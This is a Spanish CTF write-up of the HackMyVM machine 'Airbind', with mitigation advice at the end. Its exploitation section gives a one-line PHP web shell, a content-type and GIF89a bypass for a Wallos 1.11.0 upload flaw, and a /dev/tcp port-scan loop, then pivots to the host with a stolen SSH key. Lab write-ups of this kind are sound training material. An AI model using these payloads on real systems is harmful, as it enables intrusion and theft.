---
title: "Airbind"
date: 2026-06-02
draft: false
description: "Writeup de la máquina Airbind en HackMyVM."
categories: ["HackMyVM"]
tags: ["Exposed Database", "Default Credentials", "Authenticated Remote Code Execution", "Sudo Misconfiguration", "Privilege Escalation", "Container Breakout"]
image: "/images/Airbind.webp"
level: Medium
---

# Enumeración

Comenzamos con la identificación de la máquina víctima mediante la herramienta de **arp-scan** de la siguiente manera:

```bash
sudo arp-scan -I eth0 --localnet --ignoredups
```

![img1](/images/Pasted%20image%2020260528080837.webp)

Podemos observar la IP de la máquina víctima, en este punto con ayuda de la herramienta ping vamos a intentar intuir el dispositivo verificando el valor de su `ttl` de la siguiente forma:

```bash
ping -c 1 192.168.100.111
```

![img2](/images/Pasted%20image%2020260528081037.webp)

Tenemos un `ttl=64` esto nos dice que el sistema operativo que se está implementando posiblemente sea de base Unix.

Comenzamos con el escaneo con la ayuda de la herramienta **nmap**, esto para poder identificar los posibles puertos abiertos de la siguiente manera:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.100.111 -oG allPorts
```

![img3](/images/Pasted%20image%2020260528081346.webp)

Observamos en el resultado el puerto 80 abierto con el servicio `httpd` esto quiere decir una posible web. Vamos a realizar un escaneo algo más puntual contra este puerto, el objetivo es descubrir la mayor cantidad de información sobre el mismo:

```bash
sudo nmap -p80 -sCV 192.168.100.111 -oN target
```

![img4](/images/Pasted%20image%2020260528081805.webp)

Ya tenemos versiones más puntuales del servicio que se está implementando, así intentando buscar una vulnerabilidad conocida.

Iniciaremos intentando obtener información de la web con ayuda de **Whatweb** de la siguiente manera:

```bash
whatweb http://192.168.100.111
```

![img5](/images/Pasted%20image%2020260528082331.webp)

Podemos observar cómo la versión de Apache coincide, además tenemos el `PHPSESSID` en las cookies donde si no tiene la protección de `HttpOnly` se puede llegar a realizar un robo de credenciales, además vemos que la web tiene extensión PHP y nos especifica luego el lenguaje en realidad que es PHP esto es un punto clave a tener en cuenta si buscamos realizar algún tipo de conexión, además vemos un `PasswordField` eso quiere decir que tiene un input para contraseña por lo que se trate posiblemente de una página de login.

Con esta información inicial vamos a visitar la web y ver qué nos encontramos en ella:

![img6](/images/Pasted%20image%2020260528082844.webp)

Como se estaba intuyendo, es una web de tipo login y su extensión es de tipo PHP, por lo tanto, es su lenguaje por defecto. Lo primero que yo intentaría son ataques a bases de datos como SQL Injection, pero no funcionaron, así que procedemos a hacer un fuzzing de la web para intentar obtener todos los directorios expuestos, esto con ayuda de la herramienta de **Gobuster**:

```bash
gobuster dir -u http://192.168.100.111/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

![img7](/images/Pasted%20image%2020260528083227.webp)

Podemos observar varios directorios los cuales se procedió a revisar y lo interesante está en 2 de ellos: uno es `/images` y el otro es `/db`.
Dentro de `/images` tenemos varios directorios como veremos en la imagen pero lo más interesante es el sub directorio `/uploads`:

![img8](/images/Pasted%20image%2020260528083519.webp)

Este directorio me hace pensar que dentro de la plataforma de Wallos nosotros podemos subir archivos, donde debido a la carpeta principal me hace pensar que pueden ser imágenes.

**Nota:** el archivo Thumbs.db lo descargué y analicé pero no logré sacar información aunque tiene una extensión de base de datos.

Dentro de `/uploads` vamos a encontrar los siguientes directorios:

![img9](/images/Pasted%20image%2020260528083830.webp)

Dentro de `/icons` al parecer tenemos en realidad iconos que pueden estar siendo usados en la interfaz y lo que es en `/logos` está vacío, podemos pensar que las imágenes se suben directamente a esta raíz o en cualquiera de los dos directorios.

Bueno podemos pasar a `/db` para ver qué contiene su directorio:

![img10](/images/Pasted%20image%2020260528084218.webp)

Como podemos observar tenemos otro archivo referente a una base de datos así que nos lo descargamos para analizarlo:

![img11](/images/Pasted%20image%2020260528084450.webp)

Como vemos ya tenemos el archivo para analizarlo y con ayuda del comando `file` sacamos un poco de información de lo que es y nos detalla en realidad que es un archivo de SQLite 3 por lo tanto vamos a abrirlo para poder ver qué tiene:

```bash
sqlite3 wallos.db
```

![img12](/images/Pasted%20image%2020260528084555.webp)

Procedamos a listar las tablas de la base de datos de la siguiente manera:

```sqlite
.table
```

![img13](/images/Pasted%20image%2020260528084709.webp)

Podemos ver todas las tablas existentes donde la de `user` llama nuestra atención por lo que procedemos de forma directa a analizarla y sacar toda su información.

**Nota:** como dato extra usamos el comando `.header on` para poder ver las cabeceras en la base de datos.

```sqlite
select * from user;
```

![img14](/images/Pasted%20image%2020260528084912.webp)

lo que nos interesa en este punto es observar el usuario y su contraseña que al parecer por motivos de seguridad se encuentra cifrada por lo que tenemos 2 caminos en realidad: hacer directamente un ataque de fuerza bruta al panel o a la contraseña en este caso yo realizaré primero a la contraseña usando un diccionario de contraseñas por defecto o usuales, y si no procederemos con el panel.

Para este ataque de fuerza bruta vamos a usar la herramienta **john** y lo primero es guardar toda la contraseña en un archivo que lo llamaré `hash`:

![img15](/images/Pasted%20image%2020260528085230.webp)

Listo ya tenemos nuestro archivo por lo que procedemos con **john** de la siguiente manera:

```bash
john -w=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt hash
```

![img16](/images/Pasted%20image%2020260528111248.webp)

Como podemos observar es una contraseña por defecto y con poca seguridad.

**Nota:** antes del ataque de fuerza bruta se realizó prueba de concepto intentando contraseñas por defecto y también fue positiva al utilizar admin:admin al igual que muchas otras como root:root, user:user y más.

Continuando con la explotación ya tenemos credenciales válidas y podemos pasar a intentar ingresar al panel:

![img17](/images/Pasted%20image%2020260528111938.webp)

Listo ya dentro explorando un poco el panel algo que primero revisamos es ver las versiones del software para intentar buscar vulnerabilidades conocidas:

![img18](/images/Pasted%20image%2020260528112044.webp)

# Explotación

Como podemos observar tenemos la versión de Wallos v1.11.0, vamos a hacer una búsqueda rápida de esto en `searchsploit` o google a ver si encontramos algo:

```bash
searchsploit wallos 1.11.0
```

![img19](/images/Pasted%20image%2020260528112312.webp)

Lo que encontramos en realidad es una vulnerabilidad de subida de archivos y al ver RCE nos dice que mediante eso podríamos lograr una ejecución remota de comandos.

En este punto revisamos el archivo con la vulnerabilidad que sería de la siguiente manera:

```bash
searchsploit -x php/webapps/51924.txt
```

![img20](/images/Pasted%20image%2020260528112814.webp)

En este punto lo que más nos interesa son los pasos, al parecer para replicar esto y el cómo se da la vulnerabilidad es al momento de agregar una nueva suscripción. El punto es enviar un archivo `.php` que permita la ejecución de comandos pero para que se logre subir dicho archivo vamos a tener que cambiar el `Content-Type` a `image/jpeg` y luego agregar en la cabecera de la inyección `GIF89a;`, esto nos permite engañar al servidor primero diciéndole que el contenido es una imagen y luego modificando con la cabecera los magic numbers así evitando la detección de que es un archivo PHP.

Con esto claro, tenemos que comenzar con la modificación. Por lo tanto, vamos a crear primero un archivo con el nombre de `cmd.php`, luego en su contenido vamos a ingresar código malicioso para ejecutar comandos que sería:

```php
<?php
	system($_GET['cmd']);
?>
```

![img21](/images/Pasted%20image%2020260528113548.webp)

perfecto con nuestro archivo listo lo que vamos a hacer es capturar la petición exacta al agregar una suscripción para así poder cambiar el tipo de contenido y modificar los magic numbers, en este caso comenzamos capturando la petición original.

Entonces el panel de agregar suscripción es:

![img22](/images/Pasted%20image%2020260528114544.webp)

Como observamos, donde se puede subir un logo es donde se genera la vulnerabilidad, allí subimos nuestro archivo y luego damos a save para poder capturar con Burp Suite y la mandamos al repeater para comenzar a manipular:

![img23](/images/Pasted%20image%2020260528114821.webp)

Lo que vamos a hacer es cambiar el tipo de contenido como se indicaba y vamos a cambiar el encabezado del archivo para que no se detecte como php.

Bueno veamos cómo esto queda:

![img24](/images/Pasted%20image%2020260528115200.webp)

Como podemos observar con los cambios, se envió correctamente por lo que posiblemente ya tengamos el archivo malicioso dentro.

Ahora si recordamos nosotros tenemos `image/uploads` por lo que vamos a revisar si está allí:

![img25](/images/Pasted%20image%2020260528115852.webp)

Como podemos observar sí tenemos en el directorio descrito un archivo PHP, intentamos cargarlo a ver si se interpreta y si nos permite la ejecución de comandos:

![img26](/images/Pasted%20image%2020260528120028.webp)

Perfecto ya tenemos ejecución de comandos de forma remota, en este punto podemos realizar una reverse shell.

Primero vamos a dejar el puerto 444 en escucha desde nuestra máquina atacante:

![img27](/images/Pasted%20image%2020260528120735.webp)

En este punto ejecutamos la reverse shell en el navegador:

![img28](/images/Pasted%20image%2020260528120936.webp)

Bueno si enviamos la petición y observamos, ya tenemos la reverse shell:

![img29](/images/Pasted%20image%2020260528121029.webp)

En este punto se recomienda realizar un tratamiento a la shell para trabajar de mejor forma:

![img30](/images/Pasted%20image%2020260528121441.webp)

Por último exportamos xterm:

![img31](/images/Pasted%20image%2020260528121529.webp)

ya con esto podemos comenzar con el reconocimiento.

# Escalada de Privilegios

Comienzo identificando los usuarios del sistema operativo con ayuda del archivo `/etc/passwd` de la siguiente manera:

```bash
cat /etc/passwd | grep '.*sh'
```

![img32](/images/Pasted%20image%2020260528122456.webp)

Podemos observar los usuarios `root` y ` ubuntu`, tomando en cuenta que actualmente estamos como el usuario `www-data`, algo extra que siempre trato de hacer es verificar la IP para asegurar que estoy dentro de la máquina y no en un contenedor:

```bash
ip a
```

![img33](/images/Pasted%20image%2020260528122816.webp)

Al parecer nos encontramos dentro de un contenedor ya que la IP a la que conectamos no es la misma IP que vemos actualmente.

En este punto vamos a escalar de privilegios por lo que podemos comenzar verificando los permisos sudo que tiene el usuario actual:

```bash
sudo -l
```

![img34](/images/Pasted%20image%2020260528123135.webp)

En la respuesta se define que tenemos permitido la ejecución de comandos como el usuario `ubuntu` sin necesidad de ingresar contraseñas por lo tanto ejecutemos una bash:

![img35](/images/Pasted%20image%2020260528123419.webp)

Perfecto, ya estamos como el usuario `ubuntu` así que vamos primero a investigar un poco dentro de su carpeta de usuario:

![img36](/images/Pasted%20image%2020260528123617.webp)

No tenemos nada, así que vamos a realizar de igual forma los permisos de sudo a ver qué podemos ejecutar:

```bash
sudo -l
```

![img37](/images/Pasted%20image%2020260528123917.webp)

Lo que vemos es que podemos ejecutar sudo para cualquier cosa, vamos a realizar un sudo bash para que nos dé una bash como usuario `root` ahora:

![img38](/images/Pasted%20image%2020260528124032.webp)

Ya estamos como `root` dentro del contenedor así que podemos intentar ver el contenido de su home:

![img39](/images/Pasted%20image%2020260529081321.webp)

Como podemos observar ya tenemos la flag de usuario.

Vemos algo más que llama la atención y es que al parecer tenemos el directorio de configuración de ssh, veamos posibles claves válidas:

![img40](/images/Pasted%20image%2020260529081504.webp)

Esto es bueno ya tenemos una clave privada a usar y que podría ser válida.

Lo que voy a hacer en este caso primero es identificar el dispositivo principal que está creando la red en la que se encuentra el contenedor, donde por defecto suele ser el primer dispositivo, por lo tanto realizo un ping para ver si está activo:

```bash
ping -c 1 10.0.3.1
```

![img41](/images/Pasted%20image%2020260529083506.webp)

como logramos observar nos responde por lo tanto lo que quiero hacer es verificar de forma general si tengo puertos abiertos y cuáles son, esto recordando que en realidad el servicio de ssh por defecto corre en el puerto 22 pero los administradores por seguridad pueden haberlo cambiado, por lo tanto corremos un pequeño script de reconocimiento en una sola línea de la siguiente manera:

```bash
seq 1 65535 | while read port; do timeout .2s bash -c "</dev/tcp/10.0.3.1/$port" 2>/dev/null && echo -e "Port:$port - Open"; done
```

![img42](/images/Pasted%20image%2020260530182604.webp)

En este punto lo que podemos observar es el puerto `53` abierto lo que en realidad no me da indicios recordando que ese puerto por defecto está reservado para el DNS así que por ahora aquí no podemos hacer nada más.

Bueno posiblemente tengamos más dispositivos en la red, pero no mediante IPV4 sino utilizando de forma exclusiva IPV6. Sin embargo, hacer un escaneo para este tipo de arquitectura de red sería algo muy poco eficiente, así que vamos a emplear el comando `ping6` y como objetivo la dirección `ff02::1` que es de multicast esperando que uno o varios dispositivos en red nos contesten, y lo hacemos de la siguiente manera:

```bash
ping6 -I eth0 ff02::1
```

![img43](/images/Pasted%20image%2020260530184640.webp)

Como podemos observar tenemos respuesta de varios dispositivos pero en realidad también tenemos repetidos en toda esa lista así que voy a copiar eso y a filtrar para identificar en realidad los dispositivos a los que tenemos que realizar un escaneo de puertos:

![img44](/images/Pasted%20image%2020260530185103.webp)

como podemos observar nos quedamos con 3 dispositivos específicos que son:

- `fe80::20c:29ff:fe6e:fd49%eth0:`
- `fe80::81ea:3e6c:b5a9:ff20%eth0:`
- `fe80::a00:27ff:fe74:bbf3%eth0:`

En este punto vamos a realizar un escaneo a cada uno de los equipos que respondieron específicamente para el puerto 22 con el objetivo de ver si alguno admite la conexión por ssh:

```bash
nmap -p22 -6 fe80::a00:27ff:fe74:bbf3%eth0:
```

![img45](/images/Pasted%20image%2020260530185622.webp)

perfecto ya con el dispositivo ubicado que es el `fe80::a00:27ff:fe74:bbf3%eth0:` vamos a intentar conectarnos utilizando la clave privada que encontramos en el contenedor y lo hacemos de la siguiente manera.

Primero vamos a guardarla en un archivo en nuestra máquina:

![img46](/images/Pasted%20image%2020260530190437.webp)

como observamos ya lo tenemos en un archivo y con los permisos correctos por lo que tratamos de generar la conexión de la siguiente manera:

```bash
ssh -i id_rsa root@fe80::a00:27ff:fe74:bbf3%eth0:
```

![img47](/images/Pasted%20image%2020260530190723.webp)

perfecto ya estamos dentro y como root, veamos si encontramos la última flag:

![img48](/images/Pasted%20image%2020260530190818.webp)

Listo máquina terminada.

![img49](/images/Pasted%20image%2020260530190921.webp)

# Mitigaciónes

### 1. Exposición de directorios (Information Disclosure)

En esta máquina contamos con un serio problema de exposición excesiva de información en la web. Al momento de realizar un _fuzzing_ preliminar, descubrimos una gran cantidad de directorios expuestos, entre los cuales encontramos el archivo referente a la base de datos (SQLite). Este archivo almacenaba las credenciales del usuario administrador, lo que posteriormente aprovechamos para obtener acceso.

Se propone restringir el acceso público a directorios sensibles como `/db` e incluso al directorio `/images`. Adicionalmente, se debe deshabilitar el "Directory Listing" (listado de directorios) en la configuración del servidor web (Apache/Nginx) para evitar que, con el simple hecho de ver carpetas como `/uploads`, un atacante pueda mapear la estructura interna de la aplicación y describir posibles vectores de ataque.

### 2. Credenciales por defecto

Otro problema crítico es el uso de credenciales por defecto. Hay que tener en cuenta que las contraseñas predeterminadas son poco efectivas y altamente predecibles; en este caso, las credenciales eran `admin:admin`. Esto no solo deriva en un ataque de fuerza bruta contra los _hashes_ extraídos de la base de datos, sino que, en la etapa preliminar de reconocimiento, probar credenciales por defecto en los paneles de inicio de sesión suele dar resultados positivos directos.

Se propone exigir a los usuarios que utilicen contraseñas seguras, implementando políticas de contraseñas que fuercen una longitud mínima de 8 caracteres (no solo dígitos), requiriendo combinaciones de números, letras mayúsculas, minúsculas y caracteres especiales. Además, se debe forzar el cambio de credenciales por defecto en el primer inicio de sesión.

### 3. Control deficiente en la subida de archivos (File Upload Bypass)

Uno de los vectores explotados para ganar acceso al contenedor fue la funcionalidad de subida de archivos. Se logró evadir los filtros de validación (basados únicamente en el `Content-Type` de la petición HTTP y en los _magic numbers_) modificando las cabeceras para hacer pasar un archivo PHP por una imagen (añadiendo `GIF89a;`). Esto permitió alojar un archivo malicioso en el servidor y cargarlo posteriormente para lograr Ejecución Remota de Comandos (RCE).

Se proponen verificaciones más robustas a nivel de servidor. En lugar de intentar filtrar el contenido del archivo buscando palabras clave, las mejores prácticas dictan:

1. Almacenar los archivos subidos fuera del directorio raíz de la web (`webroot`), o en su defecto, deshabilitar completamente la ejecución de código (ej. PHP) dentro de la carpeta `/uploads`.
2. Renombrar aleatoriamente todos los archivos al subirlos.
3. Utilizar una lista blanca (_whitelist_) estricta de extensiones permitidas, descartando o reescribiendo cualquier extensión no autorizada para evitar la interpretación de código malicioso.

### 4. Mala gestión de Privilegios (Sudo Misconfiguration)

Ya con la máquina comprometida, es de reconocer el buen uso inicial de Docker para aislar la aplicación web; sin embargo, el problema radica en la pésima gestión de permisos mediante `sudo`. El usuario `www-data` tenía permisos para ejecutar comandos como el usuario `ubuntu` sin necesidad de proporcionar contraseña. Aún peor, el usuario `ubuntu` contaba con permisos equivalentes para ejecutar cualquier comando como `root`, facilitando la escalada de privilegios total dentro del entorno.

Se debe aplicar estrictamente el **Principio de Menor Privilegio (PoLP)**. Se propone una gestión óptima del archivo `/etc/sudoers`, donde tanto el usuario `www-data` como `ubuntu` cuenten única y exclusivamente con los permisos mínimos necesarios para ejecutar tareas o binarios específicos requeridos para su funcionamiento, evitando asignaciones amplias (`ALL`) que abren la puerta a vectores de escalada de privilegios.

### 5. Mala gestión de Secretos (SSH Key Exposure)

Aunque el entorno web estaba correctamente aislado en un contenedor, se encontró una clave privada SSH válida (`id_rsa`) almacenada dentro del directorio de configuración del contenedor. Al enumerar la red IPv6 y descubrir la interfaz del host principal, esta clave permitió pivotar y acceder directamente al host por el puerto 22, rompiendo así el aislamiento de la arquitectura.

Nunca se deben almacenar claves privadas, credenciales de infraestructura o secretos en el sistema de archivos de un contenedor expuesto a servicios públicos. Se recomienda utilizar gestores de secretos (como HashiCorp Vault o Docker Secrets) o inyectar las variables estrictamente necesarias en tiempo de ejecución, asegurando que un compromiso del contenedor web no comprometa el servidor host.
